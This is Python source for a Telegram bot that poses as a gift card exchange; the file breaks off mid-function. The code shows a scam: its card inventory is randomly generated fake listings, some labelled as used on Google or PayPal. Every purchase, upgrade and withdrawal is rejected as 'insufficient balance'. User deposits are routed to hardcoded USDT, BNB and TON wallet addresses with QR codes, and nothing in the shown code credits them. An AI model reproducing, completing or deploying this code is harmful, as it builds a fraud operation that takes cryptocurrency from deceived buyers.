import asyncio
import logging
import os
import random
import io
import threading
import warnings
from datetime import datetime, timedelta
from typing import List, Dict, Optional
from collections import defaultdict

import qrcode
import httpx
from flask import Flask

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from apscheduler.schedulers.asyncio import AsyncIOScheduler

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Suppress PTB's per_message warning — expected when mixing MessageHandler and
# CallbackQueryHandler states in a ConversationHandler.
warnings.filterwarnings("ignore", message="If 'per_message=False'", category=UserWarning)

BOT_TOKEN = os.environ["BOT_TOKEN"]

BIN_DATA = [
    ("533985xx", "CAD"),
    ("461126xx", "CAD"),
    ("373778xx", "AUD"),
    ("377935xx", "AUD"),
    ("375163xx", "AUD"),
    ("435880xx", "USD"),
    ("491277xx", "USD"),
    ("511332xx", "USD"),
    ("428313xx", "USD"),
    ("520356xx", "USD"),
    ("409758xx", "USD"),
    ("525362xx", "USD"),
    ("451129xx", "USD"),
    ("434340xx", "USD"),
    ("426370xx", "USD"),
    ("411810xx", "USD"),
    ("403446xx", "USD"),
    ("533621xx", "USD"),
    ("446317xx", "USD"),
    ("457824xx", "USD"),
    ("545660xx", "USD"),
    ("432465xx", "USD"),
    ("516612xx", "USD"),
    ("484718xx", "USD"),
    ("485246xx", "USD"),
    ("402372xx", "USD"),
    ("457851xx", "USD"),
]

BIN_GROUPS = {
    "vanilla": ["411810xx", "409758xx", "520356xx", "525362xx", "484718xx", "545660xx"],
    "cardbalance": ["428313xx", "432465xx", "457824xx"],
    "walmart": ["485246xx"],
    "giftcardmall": ["451129xx", "403446xx", "435880xx", "511332xx"],
    "joker": ["533985xx", "461126xx"],
    "amex": ["373778xx", "377935xx", "375163xx"],
}

USDT_ADDRESSES = [
    "0xa09adc5ce6767e983542dd1624844a60fa0611f2",
    "0x5be850b6dc71605af91e8e3c73d36cda82ffe46a",
    "0x4579cfc7530798c4b2c40acaa3a15091d2357c31",
    "0xb69c8529d0361e0eff5891c8895961111c25bb39",
    "0x2a63f21e1a8e323e5da732e0b14f455122bf6718",
    "0x0bff860fe3f9d7d51cc66cfd836f7213d7f125c9",
    "0xbd1213366006894ca652a63c9848367852577b2f",
    "0xb797c3dd7f911bba18c645998a4329ab8a883f29",
    "0xcc102ecbcf12475fd171c753a6eba32136dab122",
    "0x2fe7ded521b2a32458aa4fee80938fb5408f4929",
]

BNB_ADDRESSES = USDT_ADDRESSES

TON_ADDRESSES = [
    "UQBoEG9g9K9bpgew4KN34FikQ8NuLNN74wdToOt8DvSHlFkB",
    "UQBxjhv-WGal_oSEFz0ZsktGybyfwQldswqiZsqK6KNqgEwZ",
    "UQBTrc1eaEZTYMaxxSgc6I92xaLhf89vhUvYFnMvXg9w32tM",
    "UQBJxlHebSOgpjKNcM5OUHiKoPwbJzHUYIJKQW9n1UtkLI81",
    "UQC7QhTb1pH6shsPRmCbkugxwm1q-ZzDuue-F251LvsgrFc9",
    "UQBEYp4F9aB2alzdzQgbMM-UdVocj9Os0J5T2VpeRyGS2LAL",
    "UQDFkANL5sT4_5BbS598ckFIS_uzHM0fOxlFfbqV5Nh9DvdK",
    "UQDBMsUsrsaGHA0txjcl9CoAr4o98l1NME-yahOAoWPbMPvl",
    "UQD5_8AhdFPicf6k9r1kKyzPv-MSfcL1LOKM4AHhNCPvPbgA",
    "UQDZN_LU_KkCCCnEvjBdbj1xNIH_ImExSvtgtgMB0GOVbVeD",
]


class Card:
    def __init__(self, card_number, currency, balance, stickers=None, status="registered"):
        self.card_number = card_number
        self.bin = card_number[:6] + "xx"
        self.currency = currency
        self.balance = balance
        self.stickers = stickers if stickers else []
        self.status = status
        self.purchased = False
        self.out_of_stock = False

    def display(self, index=None):
        sticker_str = " ".join(self.stickers)
        if sticker_str:
            sticker_str = " " + sticker_str
        prefix = f"{index}. " if index is not None else ""
        return f"{prefix}{self.bin} {self.currency}${self.balance:.2f} at 36%{sticker_str}"


class UserData:
    def __init__(self, user_id, username):
        self.user_id = user_id
        self.username = username
        self.balance = 0.0
        self.cards_purchased = []
        self.total_spent = 0.0
        self.vip = False
        self.referral_code = None
        self.referred_by = None
        self.referrals = []
        self.earned = 0.0
        self.pending_deposit = None


cards: List[Card] = []
user_data: Dict[int, UserData] = {}
is_updating = False

ADMIN_ID = 8508012498
broadcast_mode = {"active": False}
update_start_time = None
current_page = defaultdict(lambda: 1)
current_filter = defaultdict(lambda: None)


def _build_cards(balances: list, used_numbers: set) -> list:
    """Build Card objects for the given list of balances, avoiding duplicate numbers."""
    bin_choices = [b[0] for b in BIN_DATA]
    currency_map = {b[0]: b[1] for b in BIN_DATA}
    built = []

    for bal in balances:
        bin_prefix = random.choice(bin_choices)
        currency = currency_map[bin_prefix]
        attempts = 0
        while attempts < 100:
            suffix = str(random.randint(0, 99)).zfill(2)
            full_num = bin_prefix[:6] + suffix
            if full_num not in used_numbers:
                used_numbers.add(full_num)
                break
            attempts += 1
        else:
            full_num = bin_prefix[:6] + str(len(used_numbers) % 100).zfill(2)
            used_numbers.add(full_num)

        stickers = []
        rand_val = random.random()
        if rand_val < 0.65:
            stickers = []
        elif rand_val < 0.75:
            stickers = ["🔄"]
        elif rand_val < 0.80:
            stickers = ["🅶", "🅿"]
        elif rand_val < 0.88:
            stickers = ["🔄", "🅶"]
        elif rand_val < 0.92:
            stickers = ["🅿"]
        elif rand_val < 1.00:
            stickers = ["🅶"]
        if bal >= 300:
            stickers = []

        status = "unregistered" if random.random() < 0.20 else "registered"
        built.append(Card(full_num, currency, bal, stickers, status))

    return built


def _random_balances(num_cards: int) -> list:
    count_under_1 = max(0, round(num_cards * 0.11))
    count_500 = max(0, round(num_cards * 0.048))
    count_1_10 = max(0, round(num_cards * 0.085))
    count_10_20 = max(0, round(num_cards * 0.09))
    remaining = num_cards - count_under_1 - count_500 - count_1_10 - count_10_20
    if remaining < 0:
        count_under_1 = max(0, count_under_1 + remaining)
        remaining = 0

    balances = []
    for _ in range(count_under_1):
        balances.append(round(random.uniform(0.10, 0.98), 2))
    for _ in range(count_500):
        balances.append(500.00)
    for _ in range(count_1_10):
        balances.append(round(random.uniform(1.00, 10.00), 2))
    for _ in range(count_10_20):
        balances.append(round(random.uniform(10.01, 20.00), 2))
    for _ in range(remaining):
        if random.random() < 0.8:
            balances.append(round(random.uniform(20.01, 40.00), 2))
        else:
            balances.append(round(random.uniform(40.01, 499.99), 2))

    random.shuffle(balances)
    return balances


def generate_cards():
    global cards
    num_cards = random.randint(300, 350)
    balances = _random_balances(num_cards)
    new_cards = _build_cards(balances, used_numbers=set())
    new_cards.sort(key=lambda c: c.balance, reverse=True)
    cards = new_cards
    logger.info("Generated %d cards", len(cards))


def get_user_data(update: Update) -> UserData:
    user = update.effective_user
    if user.id not in user_data:
        user_data[user.id] = UserData(user.id, user.username or str(user.id))
    return user_data[user.id]


def get_current_cards(user_id: int):
    filter_name = current_filter[user_id]
    if filter_name is None:
        return cards
    elif filter_name == "__cents__":
        return [c for c in cards if c.balance < 1.0]
    elif filter_name == "unregistered":
        return [c for c in cards if c.status == "unregistered"]
    elif filter_name == "registered":
        return [c for c in cards if c.status == "registered"]
    elif filter_name in BIN_GROUPS:
        bins = BIN_GROUPS[filter_name]
        return [c for c in cards if c.bin in bins]
    return cards


def get_page_cards(user_id: int, page: int):
    filtered = get_current_cards(user_id)
    total_cards = len(filtered)
    total_pages = max(1, (total_cards + 9) // 10)
    page = max(1, min(page, total_pages))
    start = (page - 1) * 10
    end = start + 10
    return filtered[start:end], total_cards, total_pages


def format_listing(user_id: int, page: int, update_time: str):
    page_cards, total_cards, total_pages = get_page_cards(user_id, page)
    u = user_data.get(user_id) or UserData(user_id, str(user_id))
    balance_usd = u.balance

    card_lines = []
    for idx, card in enumerate(page_cards, start=(page - 1) * 10 + 1):
        card_lines.append(card.display(idx))

    page_balance = sum(c.balance for c in page_cards)
    legend = "Legend:\n🔄 = Re-listed\n🅶 = Used on Google\n🅿 = Used on PayPal"

    filter_name = current_filter[user_id]
    filter_display = filter_name.capitalize() if filter_name else "None"

    card_list_str = "\n".join(card_lines) if card_lines else "No cards available."

    text = (
        f"⚡️ VANILA Exchange - Main Listings V2 ⚡️\n\n"
        f"Your Balance:\n"
        f"💵 USD: ${balance_usd:.2f}\n"
        f"💎TON : 0.000000 ($0.00)\n"
        f"🔶BNB : 0.0000000 ($0.00)\n\n"
        f"{card_list_str}\n\n"
        f"Total Cards: {total_cards} | Total Cards Balance: ${page_balance:.2f}\n"
        f"{legend}\n\n"
        f"Filters: {filter_display}\n"
        f"Page: {page}/{total_pages} | Updated: {update_time}"
    )
    return text, total_pages


def get_listing_keyboard(user_id: int, page: int, total_pages: int):
    keyboard = []

    # Card rows first
    page_cards, _, _ = get_page_cards(user_id, page)
    for card in page_cards:
        purchase_text = "⚠️OUT OF STOCK" if card.out_of_stock else "🛒Purchase"
        row = [
            InlineKeyboardButton(card.bin, callback_data="noop"),
            InlineKeyboardButton(purchase_text, callback_data=f"buy_{card.card_number}" if not card.out_of_stock else "noop"),
        ]
        keyboard.append(row)

    # Navigation buttons below cards
    nav_buttons = []
    if total_pages > 1:
        if page > 1:
            nav_buttons.append(InlineKeyboardButton("⏮First", callback_data="page_1"))
            nav_buttons.append(InlineKeyboardButton("⏪Back", callback_data=f"page_{page-1}"))
        if page < total_pages:
            nav_buttons.append(InlineKeyboardButton("Next⏩", callback_data=f"page_{page+1}"))
            nav_buttons.append(InlineKeyboardButton("Last⏭", callback_data=f"page_{total_pages}"))
    if nav_buttons:
        keyboard.append(nav_buttons)

    # Action buttons at the very bottom
    keyboard.append([
        InlineKeyboardButton("💰Deposit", callback_data="deposit"),
        InlineKeyboardButton("Refresh🔂", callback_data="refresh"),
        InlineKeyboardButton("🔍Filters", callback_data="show_filters"),
    ])

    return InlineKeyboardMarkup(keyboard)


def get_filters_keyboard():
    buttons = [
        [InlineKeyboardButton("🔓Unregistered", callback_data="filter_unregistered"),
         InlineKeyboardButton("🔐Registered", callback_data="filter_registered")],
        [InlineKeyboardButton("⚪Vanilla", callback_data="filter_vanilla"),
         InlineKeyboardButton("💠CardBalance", callback_data="filter_cardbalance")],
        [InlineKeyboardButton("☀️Walmart", callback_data="filter_walmart"),
         InlineKeyboardButton("🛍️GiftCardMall", callback_data="filter_giftcardmall")],
        [InlineKeyboardButton("🎭Joker", callback_data="filter_joker"),
         InlineKeyboardButton("🟦AMEX", callback_data="filter_amex")],
        [InlineKeyboardButton("🧹Clear Filters", callback_data="filter_clear")],
        [InlineKeyboardButton("◀️ Back", callback_data="filters_back")],
    ]
    return InlineKeyboardMarkup(buttons)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_updating:
        msg = update.message or (update.callback_query and update.callback_query.message)
        if msg:
            await msg.reply_text("The bot is currently updating, please wait ⚠️")
        return
    user = update.effective_user
    username = user.username or str(user.id)
    if user.id not in user_data:
        user_data[user.id] = UserData(user.id, username)

    text = (
        f"🤝 Welcome to the Family, {username}! 👋\n\n"
        "🚀 Introducing Exchange Bot — The ultimate platform designed to make buying, selling, "
        "and listing unused Gift Cards faster, safer, and more profitable for you!\n\n"
        "💎 Key Features:\n"
        "🔹 Zero Fees: Complete access is 100% FREE!\n"
        "🔹 Massive Inventory: Explore a vast collection of premium Gift Cards.\n"
        "🔹 Free Tools: Leverage our built-in checker and list your cards at zero cost.\n\n"
        "🎮 User Dashboard:\n"
        "👤 Profile  |  💰 Deposit  |  📋 Listings  |  🛒 Buy\n\n"
        "🔔 Real-Time Alerts:\n"
        "Make sure to follow our 📦 Stock Notify channel for instant stock updates and premium drops!\n\n"
        "📞 Customer Support:\n"
        "Got questions or need help? We've got your back!\n"
        "💬 Contact us at: @Vanila_cards"
    )
    keyboard = [
        [InlineKeyboardButton("📋Listings", callback_data="listings"),
         InlineKeyboardButton("👤Profile", callback_data="profile")],
        [InlineKeyboardButton("🖥️ Vendor Dashboard", callback_data="vendor"),
         InlineKeyboardButton("🔎Checker", url="http://t.me/VanilaChecker_bot")],
        [InlineKeyboardButton("📢Stock update", url="https://t.me/+0-iT-C83KNkxODk1")],
    ]
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))


async def listings_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_updating:
        await update.message.reply_text("The bot is currently updating, please wait ⚠️")
        return
    user_id = update.effective_user.id
    if user_id not in user_data:
        user_data[user_id] = UserData(user_id, update.effective_user.username or str(user_id))
    current_page[user_id] = 1
    await show_listing(update, context, user_id, 1)


async def show_listing(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, page: int, force_new: bool = False):
    if is_updating:
        if update.callback_query:
            await update.callback_query.edit_message_text("The bot is currently updating, please wait ⚠️")
        else:
            await update.message.reply_text("The bot is currently updating, please wait ⚠️")
        return
    current_page[user_id] = page
    text, total_pages = format_listing(user_id, page, datetime.now().strftime("%I:%M %p"))
    keyboard = get_listing_keyboard(user_id, page, total_pages)
    if update.callback_query and not force_new:
        await update.callback_query.edit_message_text(text, reply_markup=keyboard)
    elif update.callback_query:
        # Opened from a menu button (e.g. "Listings") — always send a fresh message.
        await update.callback_query.message.reply_text(text, reply_markup=keyboard)
    else:
        await update.message.reply_text(text, reply_markup=keyboard)


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if is_updating:
        await query.edit_message_text("The bot is currently updating, please wait ⚠️")
        return

    user_id = query.from_user.id
    if user_id not in user_data:
        user_data[user_id] = UserData(user_id, query.from_user.username or str(user_id))
    data = query.data

    if data == "noop":
        return

    if data == "withdraw_cancel":
        await query.message.delete()
        return

    if data == "withdraw_confirm":
        await query.edit_message_text("⏳ Please wait... Checking your balance.....")
        await asyncio.sleep(1)
        await query.message.delete()
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text="You don't have enough balance to withdraw!\nFor any query, contact admin!  @Vanila_cards"
        )
        return

    if data == "listings":
        current_page[user_id] = 1
        current_filter[user_id] = None
        await show_listing(update, context, user_id, 1, force_new=True)
        return

    if data == "refresh":
        await show_listing(update, context, user_id, current_page[user_id])
        return

    if data == "profile":
        await profile(update, context)
        return

    if data == "vendor":
        await vendor_dashboard(update, context)
        return

    if data == "buy_vendor":
        await buy_vendor_access(update, context)
        return

    if data == "start_menu":
        await start(update, context)
        return

    if data == "deposit":
        await deposit_command(update, context)
        return

    if data == "check_balance":
        await check_balance(update, context)
        return

    if data == "buy_vip":
        await buy_vip(update, context)
        return

    if data == "redeem_code_btn":
        await redeem(update, context)
        return

    if data == "confirm_vip":
        await confirm_vip(update, context)
        return

    if data == "show_filters":
        await query.edit_message_reply_markup(reply_markup=get_filters_keyboard())
        return

    if data == "filters_back":
        page = current_page[user_id]
        await show_listing(update, context, user_id, page)
        return

    if data.startswith("filter_"):
        filter_name = data.replace("filter_", "")
        current_filter[user_id] = None if filter_name == "clear" else filter_name
        current_page[user_id] = 1
        await show_listing(update, context, user_id, 1)
        return

    if data.startswith("page_"):
        page = int(data.split("_")[1])
        await show_listing(update, context, user_id, page)
        return

    if data.startswith("buy_"):
        card_number = data[4:]
        card = next((c for c in cards if c.card_number == card_number), None)
        if not card:
            await query.edit_message_text("Card not found.")
            return
        if card.out_of_stock:
            await query.message.reply_text("This card is out of stock.")
            return
        reg_status = "Registration" if card.status == "registered" else "Unregistered"
        # Convert balance to USDT: divide by "USDT price in that currency", then take 36%.
        # e.g. CAD$500 ÷ 1.40 CAD/USDT = 357 USDT equivalent × 36% = 128.57 USDT
        fiat_rates = await get_fiat_rates()
        usdt_equiv = card.balance / fiat_rates.get(card.currency, 1.0)
        total_cost = usdt_equiv * 0.36
        text = (
            f"<b>🛒Purchase Information</b>\n\n"
            f"Card: {card.bin}\n"
            f"Balance: {card.currency}${card.balance:.2f}\n"
            f"Purchase Rate: 36%\n"
            f"Total Cost: ${total_cost:.2f}\n"
            f"Registration Status: {reg_status}\n"
            f"Card Status: Fresh\n"
            f"Click Confirm to proceed with purchase"
        )
        keyboard = [
            [InlineKeyboardButton("⛔ Cancel", callback_data=f"cancel_purchase_{card.card_number}"),
             InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_purchase_{card.card_number}")]
        ]
        # Purchase info always opens as a fresh message, never edits the listing.
        await query.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
        return

    if data.startswith("cancel_purchase_"):
        await query.edit_message_text("⛔ Purchase cancelled.")
        return

    if data.startswith("confirm_purchase_"):
        card_number = data[len("confirm_purchase_"):]
        card = next((c for c in cards if c.card_number == card_number), None)
        if not card:
            await query.edit_message_text("Card not found.")
            return
        await query.edit_message_text("💰 Verifying your balance...")
        await asyncio.sleep(2)
        keyboard = [[InlineKeyboardButton("/listings", callback_data="listings")]]
        await query.edit_message_text(
            "❌ Insufficient balance. Please deposit funds and try again. OR Please contact with Admin: @Vanila_cards",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return

    await show_listing(update, context, user_id, current_page[user_id])


async def profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_updating:
        if update.callback_query:
            await update.callback_query.edit_message_text("The bot is currently updating, please wait ⚠️")
        else:
            await update.message.reply_text("The bot is currently updating, please wait ⚠️")
        return
    u = get_user_data(update)
    today = datetime.now().strftime("%Y-%m-%d")
    text = (
        f"👤 Your Profile\n\n"
        f"Name: {u.username}\n"
        f"ID: {u.user_id}\n"
        f"Role: User\n\n"
        f"💰 Account Balance: ${u.balance:.2f}\n"
        f"📦 Cards Purchased: {len(u.cards_purchased)}\n"
        f"💸 Total Spent: ${u.total_spent:.2f}\n"
        f"📅 Date: {today}\n"
        f"📊 Bought: {len(u.cards_purchased)}\n"
        f"Spent: ${u.total_spent:.2f}"
    )
    keyboard = [
        [InlineKeyboardButton("🎟️ REDEEM CODE", callback_data="redeem_code_btn")],
        [InlineKeyboardButton("💰 Deposit", callback_data="deposit")],
    ]
    # Profile always opens as a fresh message, never edits an existing one.
    if update.callback_query:
        await update.callback_query.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))


async def buy_vip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = get_user_data(update)
    text = (
        f"👑 VIP MEMBERSHIP\n"
        f"―――――――――――――――――――\n\n"
        f"🎁 VIP Benefits:\n"
        f"  💎 3% discount on ALL card purchases\n"
        f"  💬 Priority customer support\n"
        f"  👑 VIP badge in your profile\n\n"
        f"―――――――――――――――――――\n"
        f"💳 VIP Plans:\n\n"
        f"  ♾️ Lifetime — $40 one-time\n"
        f"     Never expires!\n\n"
        f"💰 Your Balance: ${u.balance:.2f}"
    )
    keyboard = [
        [InlineKeyboardButton("🔐Confirm", callback_data="confirm_vip"),
         InlineKeyboardButton("◀️ Back", callback_data="profile")]
    ]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))


async def confirm_vip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = get_user_data(update)
    await update.callback_query.edit_message_text("⚙️ checking your balance......")
    await asyncio.sleep(1)
    if u.balance >= 40:
        u.balance -= 40
        u.vip = True
        text = (
            f"👑 VIP MEMBERSHIP\n"
            f"―――――――――――――――――――\n\n"
            f"💰 Balance: ${u.balance + 40:.2f}\n"
            f"💳 Upgrade Fee: $40.00\n"
            f"💵 Balance After Upgrade: ${u.balance:.2f}\n\n"
            f"✅ VIP membership activated!"
        )
    else:
        text = (
            f"👑 VIP MEMBERSHIP\n"
            f"―――――――――――――――――――\n\n"
            f"💰 Balance: ${u.balance:.2f}\n"
            f"💳 Upgrade Fee: $40.00\n"
            f"💵 Balance After Upgrade: ${u.balance - 40:.2f}\n\n"
            f"❌ Insufficient balance! You need ${40 - u.balance:.2f} more"
        )
    keyboard = [[InlineKeyboardButton("💰Deposit", callback_data="deposit")]]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))


async def vendor_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "🔒 Restricted\n"
        "🛒 Vendor access is required.\n"
        "🔓 Tap 'Buy Vendor Access' to unlock the dashboard."
    )
    keyboard = [
        [InlineKeyboardButton("🔐 Buy Vendor Access", callback_data="buy_vendor")],
        [InlineKeyboardButton("Main Menu", callback_data="start_menu")],
    ]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))


async def buy_vendor_access(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.edit_message_text("🚫 Insufficient Funds\n💲 Additional $69.00 required.")


DEPOSIT_AMOUNT, DEPOSIT_CURRENCY = range(2)


async def deposit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_updating:
        if update.callback_query:
            await update.callback_query.edit_message_text("The bot is currently updating, please wait ⚠️")
        else:
            await update.message.reply_text("The bot is currently updating, please wait ⚠️")
        return
    text = (
        "💳 VANILLA BOT deposit system 💳\n"
        "―――――――――――――――――――\n"
        "🪙 Accepted coins\n"
        "USDT, TON (GRAM),  BNB\n"
        "―――――――――――――――――――\n"
        "⚠️ Minimum ~ $19\n"
        "⚡ Confirms ~1–5 min\n"
        "―――――――――――――――――――\n"
        "📢 Send the exact amount to the correct address.\n"
        "Wrong amount or address = loss of funds.\n"
        "👇 Select amount:"
    )
    keyboard = [
        [InlineKeyboardButton("$30", callback_data="deposit_30"),
         InlineKeyboardButton("$50", callback_data="deposit_50"),
         InlineKeyboardButton("$100+5%", callback_data="deposit_100")],
        [InlineKeyboardButton("📝Custom Amount", callback_data="deposit_custom")]
    ]
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))


async def deposit_amount_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "deposit_30":
        amount = 30
    elif data == "deposit_50":
        amount = 50
    elif data == "deposit_100":
        amount = 105
    elif data == "deposit_custom":
        await query.edit_message_text(
            "📝 Custom Deposit Amount\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "Enter amount in USD (minimum $19)\n"
            "📝 Example: 20, 30, 40, 100\n"
            "Then choose your coin — address generates instantly."
        )
        return DEPOSIT_AMOUNT
    else:
        return ConversationHandler.END

    context.user_data["deposit_amount"] = amount
    await show_coin_selection(query, amount)
    return DEPOSIT_CURRENCY


async def show_coin_selection(query_or_msg, amount):
    text = (
        f"💰 DEPOSIT {amount} USDT\n"
        f"―――――――――――――――――――\n\n"
        f"🪙 Choose payment coin:\n\n"
        f"💵USDT — BNB Smart Chain (BEP20)\n"
        f"💎TON — TON Network\n"
        f"🔶BNB — BNB Smart Chain (BEP20)"
    )
    keyboard = [
        [InlineKeyboardButton("🔶BNB", callback_data="deposit_coin_bnb"),
         InlineKeyboardButton("💎TON", callback_data="deposit_coin_ton"),
         InlineKeyboardButton("💵USDT", callback_data="deposit_coin_usdt")],
        [InlineKeyboardButton("🌐Others Network", callback_data="deposit_others")]
    ]
    markup = InlineKeyboardMarkup(keyboard)
    if hasattr(query_or_msg, "edit_message_text"):
        await query_or_msg.edit_message_text(text, reply_markup=markup)
    else:
        await query_or_msg.reply_text(text, reply_markup=markup)


async def deposit_custom_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amount = float(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("Please enter a valid number.")
        return DEPOSIT_AMOUNT
    if amount < 19:
        await update.message.reply_text("📝 Minimum deposit is $19.\n\n💬 Try again with a larger amount.")
        return DEPOSIT_AMOUNT
    context.user_data["deposit_amount"] = amount
    await show_coin_selection(update.message, amount)
    return DEPOSIT_CURRENCY


_fiat_cache: dict = {"usdt_per_currency": {}, "ts": 0.0}


async def get_fiat_rates() -> dict:
    """Return how many USDT equal 1 unit of each currency (via CoinGecko tether price).
    e.g. {"USD": 1.0, "CAD": 1.40, "AUD": 1.55}
    card_balance / rate * 0.36 = correct 36% cost in USDT.
    Cached for 1 hour; falls back to static rates on error."""
    now = datetime.now().timestamp()
    if now - _fiat_cache["ts"] < 3600 and _fiat_cache["usdt_per_currency"]:
        return _fiat_cache["usdt_per_currency"]
    try:
        async with httpx.AsyncClient(timeout=8) as client:
            resp = await client.get(
                "https://api.coingecko.com/api/v3/simple/price",
                params={"ids": "tether", "vs_currencies": "usd,cad,aud"},
            )
            data = resp.json().get("tether", {})
            # data = {"usd": 1.0, "cad": 1.40, "aud": 1.55}
            # → 1 USDT costs 1.40 CAD, so CAD balance ÷ 1.40 = USDT equivalent
            rates = {
                "USD": data.get("usd", 1.0),
                "CAD": data.get("cad", 1.38),
                "AUD": data.get("aud", 1.55),
            }
            _fiat_cache["usdt_per_currency"] = rates
            _fiat_cache["ts"] = now
            return rates
    except Exception as e:
        logger.warning("Fiat rate fetch failed: %s — using fallback rates", e)
        return {"USD": 1.0, "CAD": 1.38, "AUD": 1.55}


async def _fetch_bnb_price() -> float:
    """Fetch live BNB/USD price. Tries Binance then CoinGecko."""
    try:
        async with httpx.AsyncClient(timeout=8) as client:
            resp = await client.get(
                "https://api.binance.com/api/v3/ticker/price",
                params={"symbol": "BNBUSDT"},
            )
            price = float(resp.json()["price"])
            logger.info("Binance BNB price: $%.2f", price)
            return price
    except Exception as e:
        logger.warning("Binance BNB failed: %s", e)
    try:
        async with httpx.AsyncClient(timeout=8) as client:
            resp = await client.get(
                "https://api.coingecko.com/api/v3/simple/price",
                params={"ids": "binancecoin", "vs_currencies": "usd"},
            )
            price = float(resp.json().get("binancecoin", {}).get("usd") or 600)
            logger.info("CoinGecko BNB price: $%.2f", price)
            return price
    except Exception as e:
        logger.warning("CoinGecko BNB failed: %s — using fallback", e)
        return 600.0


async def _fetch_ton_price() -> float:
    """Fetch live Toncoin (The Open Network) price in USD via CoinGecko.
    IMPORTANT: Binance TONUSDT = Tokamak Network (different coin, $1.60) — never use it.
    Gate.io and KuCoin have delisted TON. CoinGecko is the only reliable source.
    """
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.get(
                "https://api.coingecko.com/api/v3/simple/price",
                params={"ids": "the-open-network", "vs_currencies": "usd"},
            )
            data = resp.json()
            price = float(data["the-open-network"]["usd"])
            logger.info("TON price (CoinGecko): $%.4f", price)
            return price
    except Exception as e:
        logger.warning("CoinGecko TON failed: %s — using fallback $3.00", e)
        return 3.0


async def get_crypto_prices() -> dict:
    """Fetch live BNB and TON prices in USD independently."""
    bnb_price, ton_price = await asyncio.gather(
        _fetch_bnb_price(),
        _fetch_ton_price(),
    )
    return {"bnb": bnb_price, "ton": ton_price}


def generate_qr_bytes(data: str) -> io.BytesIO:
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_M,
        box_size=10,
        border=4,
    )
    qr.add_data(data)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    buf.seek(0)
    return buf


async def deposit_coin_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "deposit_others":
        await query.edit_message_text(
            "🌐 Others Network deposit minimum $50. "
            "If you want to deposit, contact admin @Vanillacardex"
        )
        return ConversationHandler.END

    parts = data.split("_")
    coin = parts[2]
    usd_amount = context.user_data.get("deposit_amount", 0)

    if coin == "usdt":
        address = random.choice(USDT_ADDRESSES)
        network = "BNB Smart Chain (BEP20)"
        currency = "USDT"
        crypto_amount = usd_amount
        crypto_display = f"{crypto_amount:.2f} USDT"
    elif coin == "bnb":
        address = random.choice(BNB_ADDRESSES)
        network = "BNB Smart Chain (BEP20)"
        currency = "BNB"
        prices = await get_crypto_prices()
        bnb_price = prices["bnb"]
        crypto_amount = usd_amount / bnb_price
        crypto_display = f"{crypto_amount:.6f} BNB"
    elif coin == "ton":
        address = random.choice(TON_ADDRESSES)
        network = "TON Network"
        currency = "TON"
        prices = await get_crypto_prices()
        ton_price = prices["ton"]
        crypto_amount = usd_amount / ton_price
        crypto_display = f"{crypto_amount:.4f} TON"
    else:
        await query.edit_message_text("Invalid coin.")
        return ConversationHandler.END

    u = get_user_data(update)
    u.pending_deposit = {"amount": usd_amount, "currency": currency, "address": address}

    valid_till = (datetime.now() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M UTC")
    caption = (
        f"✅ Deposit Amount: ${usd_amount:.2f} USD\n"
        f"💎 Currency: {currency}\n"
        f"💸 Amount to Pay: `{crypto_display}`\n"
        f"🌐 NETWORK: {network}\n"
        f"🏦 Address:\n`{address}`\n\n"
        f"Valid till: {valid_till}\n"
        f"📸 Scan the QR code or copy the address above.\n"
        f"Send exactly `{crypto_display}` to complete your deposit."
    )
    keyboard = [
        [InlineKeyboardButton("Contract 💬", url="https://t.me/Vanila_cards"),
         InlineKeyboardButton("♻️Check Balance", callback_data="check_balance")]
    ]
    markup = InlineKeyboardMarkup(keyboard)

    try:
        await query.message.delete()
    except Exception:
        pass

    qr_buf = generate_qr_bytes(address)
    sent = await context.bot.send_photo(
        chat_id=query.message.chat_id,
        photo=qr_buf,
        caption=caption,
        reply_markup=markup,
        parse_mode="Markdown",
    )

    # Auto-delete after 1 hour
    context.job_queue.run_once(
        _delete_deposit_msg,
